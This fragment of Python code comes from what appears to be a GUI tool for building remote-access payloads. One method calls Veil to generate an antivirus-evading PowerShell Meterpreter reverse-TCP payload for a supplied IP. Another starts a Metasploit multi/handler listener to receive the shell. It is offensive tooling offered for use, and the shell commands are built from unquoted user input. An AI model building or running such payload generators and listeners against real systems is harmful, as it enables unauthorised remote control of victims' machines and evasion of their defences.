...
class App():
    ...
    def payload_generate(self):
        # Command line
        payload_command = subprocess.run(f"veil -t evasion -p powershell/meterpreter/rev_tcp.py -o {self.remote_access_entry_name.get()} --ip {self.remote_access_entry_ip} ", shell=True, capture_output=True)


    def listner_start(self):
        # Command line
        listner_command = subprocess.run(f"sudo msfconsole -q -x 'use multi/handler; set LHOST {self.remote_access_entry_ip}; run'", shell=True, capture_output=True)
